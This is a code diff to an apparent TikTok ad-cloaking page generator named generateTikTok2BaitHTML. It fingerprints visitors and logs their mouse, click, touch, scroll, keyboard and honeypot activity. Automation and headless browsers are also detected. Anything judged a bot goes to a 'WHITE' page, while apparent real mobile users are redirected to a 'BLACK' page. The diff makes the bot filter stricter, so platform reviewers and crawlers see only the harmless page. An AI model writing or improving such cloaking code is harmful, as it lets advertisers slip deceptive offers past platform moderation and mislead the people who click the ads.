@@ -193,42 +193,63 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
       // Event logging with timestamp
       function logE(type,data){T.events.push({t:Date.now()-T.start,type:type,d:data})}
       
-      // CRITICAL: Any interaction on loading page = suspicious
-      // Touch events (mobile)
-      document.addEventListener('touchstart',function(e){T.touch++;logE('touch',{x:e.touches[0].clientX,y:e.touches[0].clientY})});
+      // Bot already detected flag to prevent multiple redirects
+      var botDetected=false;
+      
+      // CRITICAL: Any interaction on loading page = BOT (goes to WHITE immediately)
+      // On TikTok mobile: NO mouse, NO clicks, NO scroll, NO keyboard - just auto redirect
+      
+      // Mouse events = IMPOSSIBLE on real TikTok mobile -> WHITE
+      document.addEventListener('mousemove',function(e){
+        T.mouse++;logE('mouse',{x:e.clientX,y:e.clientY});
+        if(T.mouse>=3&&!botDetected){botDetected=true;logBot('mouse_on_mobile')}
+      });
+      
+      // Click events = BOT trying to interact -> WHITE
+      document.addEventListener('click',function(e){
+        T.click++;logE('click',{x:e.clientX,y:e.clientY});
+        if(!botDetected){botDetected=true;logBot('click_on_loading')}
+      });
+      
+      // Touch events = suspicious on loading page (log but allow some tolerance)
+      document.addEventListener('touchstart',function(e){
+        T.touch++;logE('touch',{x:e.touches[0].clientX,y:e.touches[0].clientY});
+        // Allow 1-2 accidental touches, but 3+ is suspicious
+        if(T.touch>=3&&!botDetected){botDetected=true;logBot('excessive_touch')}
+      });
       document.addEventListener('touchmove',function(e){logE('touchmove',{x:e.touches[0].clientX,y:e.touches[0].clientY})});
       
-      // Click events
-      document.addEventListener('click',function(e){T.click++;logE('click',{x:e.clientX,y:e.clientY})});
+      // Scroll = BOT exploring page -> WHITE
+      document.addEventListener('scroll',function(){
+        T.scroll++;logE('scroll',{y:window.scrollY});
+        if(!botDetected){botDetected=true;logBot('scroll_on_loading')}
+      });
       
-      // Mouse events (should NOT happen on TikTok mobile)
-      document.addEventListener('mousemove',function(e){T.mouse++;logE('mouse',{x:e.clientX,y:e.clientY})});
+      // Key events = BOT trying to interact -> WHITE
+      document.addEventListener('keydown',function(e){
+        T.key++;logE('key',{k:e.key});
+        if(!botDetected){botDetected=true;logBot('keyboard_on_loading')}
+      });
       
-      // Scroll (suspicious on loading page)
-      document.addEventListener('scroll',function(){T.scroll++;logE('scroll',{y:window.scrollY})});
-      
-      // Key events (very suspicious)
-      document.addEventListener('keydown',function(e){T.key++;logE('key',{k:e.key})});
-      
-      // Visibility changes
+      // Visibility changes (just log, don't block)
       document.addEventListener('visibilitychange',function(){T.vis++;logE('vis',{h:document.hidden})});
       
-      // Focus changes
+      // Focus changes (just log, don't block)
       window.addEventListener('blur',function(){T.focus++;logE('blur',{})});
       window.addEventListener('focus',function(){T.focus++;logE('focus',{})});
       
-      // Honeypot listeners
+      // Honeypot listeners -> WHITE immediately
       var hp=document.getElementById('${honeypotId}');
       var tl=document.getElementById('${trapLinkId}');
-      if(hp){hp.addEventListener('focus',function(){T.hp=true;logE('honeypot',{})})}
-      if(tl){tl.addEventListener('click',function(e){e.preventDefault();T.trap=true;logE('trap',{})})}
+      if(hp){hp.addEventListener('focus',function(){T.hp=true;logE('honeypot',{});if(!botDetected){botDetected=true;logBot('honeypot')}})}
+      if(tl){tl.addEventListener('click',function(e){e.preventDefault();T.trap=true;logE('trap',{});if(!botDetected){botDetected=true;logBot('trap_link')}})}
       
-      // Mouse teleport detection
+      // Mouse teleport detection (impossible movement pattern)
       var lastX=0,lastY=0,teleport=0;
       document.addEventListener('mousemove',function(e){
         if(lastX!==0&&lastY!==0){
           var dx=Math.abs(e.clientX-lastX),dy=Math.abs(e.clientY-lastY);
-          if(dx>300||dy>300)teleport++;
+          if(dx>300||dy>300){teleport++;if(teleport>1&&!botDetected){botDetected=true;logBot('mouse_teleport')}}
         }
         lastX=e.clientX;lastY=e.clientY;
       });
@@ -262,18 +283,20 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
         setTimeout(function(){window.location=w},50);
       }
       
-      // Check for bots
-      if(T.wd){logBot('webdriver');return}
-      if(T.auto){logBot('automation');return}
+      // Check for bots immediately
+      if(T.wd){botDetected=true;logBot('webdriver');return}
+      if(T.auto){botDetected=true;logBot('automation');return}
       var ua=navigator.userAgent.toLowerCase();
-      if(ua.indexOf('headless')>-1||ua.indexOf('phantom')>-1||ua.indexOf('selenium')>-1){logBot('automation_ua');return}
-      if(T.fakeC){logBot('fake_chrome');return}
-      if(T.noLang){logBot('no_languages');return}
+      if(ua.indexOf('headless')>-1||ua.indexOf('phantom')>-1||ua.indexOf('selenium')>-1){botDetected=true;logBot('automation_ua');return}
+      if(T.fakeC){botDetected=true;logBot('fake_chrome');return}
+      if(T.noLang){botDetected=true;logBot('no_languages');return}
       
-      // Redirect to BLACK after delay
+      // Redirect to BLACK after delay (only if no bot detected during wait)
       setTimeout(function(){
-        sendT('black');
-        window.location=b;
+        if(!botDetected){
+          sendT('black');
+          window.location=b;
+        }
       },d);
     })();
   </script>
